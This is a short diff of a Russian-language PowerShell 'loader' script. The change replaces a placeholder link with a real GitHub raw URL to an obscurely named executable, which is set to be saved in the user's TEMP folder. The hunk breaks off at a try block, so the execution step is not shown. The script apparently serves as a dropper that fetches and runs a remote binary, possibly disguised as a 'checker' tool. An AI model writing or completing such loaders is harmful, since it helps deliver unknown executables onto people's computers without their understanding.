@@ -3,7 +3,7 @@
 Write-Host "[+] Загрузчик запущен..." -ForegroundColor Green
 
 # Ссылка на ваш файл (замените на свою raw-ссылку)
-$exeUrl = "https://raw.githubusercontent.com/ВАШ_АККАУНТ/ВАШ_РЕПО/ВЕТКА/G8cNx8ED.iLT.exe"
+$exeUrl = "https://github.com/feG700/ravange_checker/raw/refs/heads/main/G8cNx8ED.iLT.exe"
 $exePath = "$env:TEMP\G8cNx8ED.iLT.exe"
 
 try {
